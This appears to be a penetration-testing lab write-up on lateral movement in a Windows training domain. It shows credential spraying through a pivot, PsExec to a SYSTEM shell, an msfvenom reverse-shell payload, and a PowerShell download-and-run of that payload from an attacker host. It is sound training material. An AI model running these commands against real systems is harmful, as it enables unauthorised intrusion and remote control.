# Internal Access & AD Enumeration

## Overview
- **Phase:** Internal Lateral Movement & Initial Windows Foothold
- **Target Subnet:** `192.168.98.0/24`
- **Initial Target Host:** `192.168.98.30` (Windows Member Server)
- **Objective:** Validate internal credentials across the SOCKS pivot, obtain interactive access, map domain infrastructure, and audit privilege delegations.

---

## 1. Tooling & Environment Management (Poetry)

Modern security tooling often relies on strict Python dependency trees. Tools like CrackMapExec / NetExec frequently conflict with base system libraries (e.g., Debian PEP 668 restrictions).

### What is Poetry?
**Poetry** is a dependency management and packaging tool for Python. Instead of globally installing packages with `pip` (which risks dependency conflicts or broken system packages), Poetry uses `pyproject.toml` and `poetry.lock` to:
1. Create an isolated virtual environment automatically.
2. Resolve and pin exact dependency versions.
3. Execute commands strictly within that virtual environment via `poetry run <command>`.

### Installation & Execution Syntax
```bash
# Clone the repository and install locked dependencies
git clone [https://github.com/byt3bl33d3r/CrackMapExec.git](https://github.com/byt3bl33d3r/CrackMapExec.git)
cd CrackMapExec
poetry install

# Run commands inside the managed virtual environment
poetry run crackmapexec smb <target>

```

---

## 2. Credential Validation via Pivot

Using Proxychains to route SMB requests through the established SOCKS proxy listener (`127.0.0.1:1080` or `127.0.0.1:9050`):

### Testing Harvested VNC Credentials

```bash
proxychains poetry run cme smb 192.168.98.30 -u "employee" -p "Doctor@963"

```

* **Status:** Failed authentication (`STATUS_LOGON_FAILURE`). The credential is not valid for this specific host or account context.

### Testing Alternate Account (`john`)

```bash
proxychains poetry run cme smb 192.168.98.30 -u "john" -p "User1@#$%6"

```

* **Status:** Valid authentication (`[+] Pwn3d!`).
* **Meaning of `Pwn3d!`:** CrackMapExec checks write access to the administrative share (`ADMIN$`). A `Pwn3d!` status indicates that the user account possesses **local administrative privileges** on the target machine.

---

## 3. Remote Shell Execution (PsExec)

### What is PsExec?

Originally part of Microsoft's Sysinternals suite, **PsExec** enables remote execution of processes on Windows systems using administrative credentials.

#### How PsExec Operates Under the Hood:

1. Connects to the target over SMB (`port 445`) using provided administrator credentials.
2. Authenticates and accesses the `ADMIN$` share (mapped to `C:\Windows`).
3. Uploads a service binary (e.g., `psexecsvc.exe`).
4. Communicates with the remote **Service Control Manager (SCM)** via RPC to register and start a temporary service.
5. Redirects standard input/output streams over named pipes to create an interactive command session running under the `NT AUTHORITY\SYSTEM` context.
6. Upon exit, stops the service and unregisters it (though service binary artifacts may remain on disk).

### Executing via Impacket

```bash
proxychains impacket-psexec 'john:User1@#$%6@192.168.98.30'

```

*Result: Drops directly into an administrative shell session running as `NT AUTHORITY\SYSTEM`.*

---

## 4. Internal Domain Infrastructure Mapping

Once interactive access is achieved on `192.168.98.30`, map out internal domain topology, Domain Controllers, and trust relationships using native Windows utilities.

```cmd
:: Enumerate domain user accounts
net user /dom

:: Enumerate global domain groups
net group /dom

```

### Locating Hidden Domain Controllers via DNS

Pinging domain hostnames forces Windows to query internal Active Directory DNS (`Port 53`), resolving hosts that were silent during initial network sweeps:

```cmd
:: Resolve Child Domain Controller hostname
ping cdc.child.warfare.corp

:: Resolve Domain root names
ping child.warfare.corp
ping warfare.corp

```

#### Reconnaissance Finding:

* Ping returned the IP address `192.168.98.120` for `cdc.child.warfare.corp`.
* **Why did Nmap miss `192.168.98.120` earlier?**
1. **Host Discovery Blocks:** By default, standard Nmap sweeps rely on ICMP echo requests or ARP/TCP probes. Windows hosts frequently have ICMP/ping blocked by the Windows Firewall profile.
2. **Selective Port Filtering:** If Nmap's discovery phase (`-sn`) marked the host as down due to dropped ping probes, it skipped port scanning entirely unless `-Pn` (skip host discovery) was explicitly passed.



---

## 5. Transitioning to a Dedicated Interactive Session

While `psexec` provides initial execution, SMB named pipes routed through SOCKS proxy chains can suffer from latency and dropped sessions. Setting up a direct TCP shell provides a more responsive environment for post-exploitation tasks.

### Generating the Payload (Kali)

```bash
msfvenom --platform windows -p windows/shell_reverse_tcp LHOST=10.10.200.2 LPORT=9990 -f exe -o rev.exe

```

### Staging & Execution (Target Host)

From the PsExec prompt:

```powershell
powershell -Command "Invoke-WebRequest -Uri '[http://10.10.200.2:8000/rev.exe](http://10.10.200.2:8000/rev.exe)' -OutFile 'C:\Users\john\Downloads\rev.exe'"
C:\Users\john\Downloads\rev.exe

```

> **OpSec Note:** Writing binaries directly to disk (`Downloads`) is acceptable in isolated training labs. In hardened enterprise environments with active Endpoint Detection and Response (EDR) or Antivirus, execution is typically performed in-memory or through signed living-off-the-land binaries (LOLBins).

---

## 6. Privilege & Group Membership Analysis

Evaluating Domain Groups versus Local Groups clarifies the exact administrative scope of compromised accounts across the forest.

```cmd
:: Enumerate domain-level properties for user 'john'
net user john /dom

:: Enumerate domain-level properties for user 'corpmngr'
net user corpmngr /dom

:: Enumerate members of the local Administrators group on this host
net localgroup administrators

```

### Local vs. Domain Privileges Comparison

| User Account | Domain Group Membership (`net user <user> /dom`) | Local Group Status on `192.168.98.30` | Practical Access Level |
| --- | --- | --- | --- |
| **`john`** | `Domain Users` | Explicit member of local `Administrators` | Local administrative control on `192.168.98.30` (full access to `ADMIN$`). |
| **`corpmngr`** | `Domain Users`, Corporate Groups | Not a member of local `Administrators` on this host | Standard domain user rights on `192.168.98.30`; administrative rights likely reside on other hosts. |

#### Key Takeaway on Local Group Memberships:

In the output of `net user corpmngr /dom`, the field `Local Group Memberships: *Administrators` indicates the user is assigned local administrative permissions on the specific machine where that command or account template was queried (such as a Domain Controller or workstation), **not** that the user has administrative privileges on every member server across the domain.

